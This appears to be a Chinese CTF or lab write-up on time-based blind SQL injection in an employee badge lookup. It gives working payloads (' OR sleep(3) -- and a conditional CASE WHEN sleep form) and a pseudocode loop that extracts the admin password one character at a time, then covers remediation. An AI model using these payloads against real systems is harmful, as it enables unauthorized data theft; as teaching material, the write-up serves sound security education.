# 工号查询处的时间盲注

## 这一题在教什么

前两道 SQLi 都还"看得见"：一道有报错回显，一道有结果表格。这一题把可见性整个拿掉 ——
**返回的 HTML 永远一模一样**，连"有没有这条记录"都读不出来。

这时候只剩一条信道：**响应时间**。

> 如果我能让"条件成立"这件事变成"慢 3 秒"，就等于给自己造了一个一位一位的开关。

这就是时间盲注。它是注入里最慢、最笨、但在**完全没有回显**的真实站点上唯一可用的手法。

## 为什么这一题要注册一个 `sleep()` 函数

SQLite 没有内置的 `SLEEP()`（MySQL / Postgres 有）。没有它就没法造延迟。

真实项目里通过 `con.create_function("xxx", 1, fn)` 注册自定义 SQL 函数是很常见的
做法（业务上要做单位换算、脱敏、加解密之类）。所以这里的 payload 跟你在 MySQL 上
写的**完全一样**：

```sql
' OR sleep(3) -- 
```

顺带说一句：这也是为什么"注入点能不能利用"往往不取决于数据库本身，
而取决于**这个应用往数据库里塞了什么能力**。

## 漏洞在哪

`module.py`：

```python
sql = "SELECT name FROM employees WHERE badge = '%s'" % badge
con.execute(sql).fetchone()
```

拼字符串。而且：

```python
except sqlite3.Error:
    pass          # 报错也不说
```

页面永远渲染同一句话，所以三个信号（回显、报错、真假）都没有了。

## 怎么打通

**第一步：确认延迟能被触发。**

```
' OR sleep(1) -- 
```

这一下会明显卡住。信道就建立好了。

> **一个容易算错的地方：延迟会乘以表的行数。**
>
> SQLite 是**按扫描到的行**逐行求值 `WHERE` 的。这张 `employees` 表有 3 行，
> 每一行的 `badge = ''` 都是假，所以右边那个 `sleep` 要算 3 次 ——
> `sleep(1)` 实际慢 3 秒左右。
>
> 真实盲注里也是这样：你写 `sleep(5)`，目标表有几万行的话就是几万 × 5 秒。
> 所以**脚本里的阈值要按"实际慢了多少秒"来定，不是按你写的参数**。

**第二步：把 `sleep` 变成条件式的。**

```sql
' OR CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='k'
     THEN sleep(1) ELSE 1 END -- 
```

- 慢 → 猜对了
- 快 → 猜错了

把 `substr` 的第二个参数从 1 数到 6，一位一位就把整个密码问出来了。

**为什么要写成 `OR CASE WHEN ... THEN sleep(3) ELSE 1 END`？**

`OR` 左边是 `badge = ''`，恒假，所以数据库必须去算右边。右边两个分支都返回真值
（`sleep` 返回 1），所以**页面完全一样**，差别只有时间。

**第三步：写脚本。**

手点 200 多次不现实。伪代码：

```
for pos in 1..6:
    for ch in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = "' OR CASE WHEN (SELECT substr(password,%d,1) FROM users "\
                  "WHERE username='admin')='%s' THEN sleep(1) ELSE 1 END -- " % (pos, ch)
        发请求，测耗时
        if 耗时 > 2 秒:          # 按实际观测到的延迟定，别照抄参数值
            记下 ch; break
```

最多 6 × 36 = 216 个请求。按上面那 3 行表算，一次命中大约 3 秒 ——
所以一个字符平均要花十秒上下，整轮几分钟。这就是盲注的"慢"。

用 `curl -w '%{time_total}'` 或者 Python 的 `requests` + `time.monotonic()` 都行。

**省请求的写法：**

| 手法 | 效果 |
|---|---|
| 二分法：用 `> 'm'` 这种比较代替 `=` | 36 个字符压到 log2(36) ≈ 6 次 |
| 一次问一个十六进制位：`hex(password)` | 字符集固定成 16 个 |
| `sqlmap --technique=T` | 让它自动做上面这些 |

## 现实里怎么判断"这里能不能盲注"

时间盲注最烦的不是写 payload，是**排除干扰**：

1. **基线**：先发几十个正常请求，量出响应时间的抖动范围。
   如果正常抖动就有 1 秒，那你就得用更长的 sleep。
2. **重复确认**：同一个条件问 3 次，都慢才算数。网络抖动会骗你。
3. **看连接而不是看响应**：有些场景响应快但连接不关，那也算延迟。
4. **带外（OOB）优先**：如果目标能往外发请求，用 DNS 带外比时间盲注快几个数量级。
   时间盲注是"实在没别的办法"时的办法。

## 怎么修

**参数化查询**，跟前面两道一样：

```python
con.execute("SELECT name FROM employees WHERE badge = ?", (badge,))
```

但这一题值得多说一句：**光"不报错、不回显"不是修复。**

很多人的想法是"我把错误藏起来、页面统一返回，攻击者就没办法了"。
这一题证明了那是错的 —— 只要输入还能影响 SQL 的执行，**执行时间本身就是输出**。

真正的修复顺序：

1. **参数化**（根治）
2. **查库的账号最小权限**：连 `users` 表都读不到，就没得猜
3. **查询超时**：给数据库语句设个上限（SQLite 可以注册 progress handler，
   或者在应用层用 `con.set_progress_handler`）。这能挡掉一部分时间盲注，
   但会留下"超时与否"这个新信号 —— **是缓解不是修复**
4. **限流**：盲注要发成百上千个请求，限流能大幅提高成本
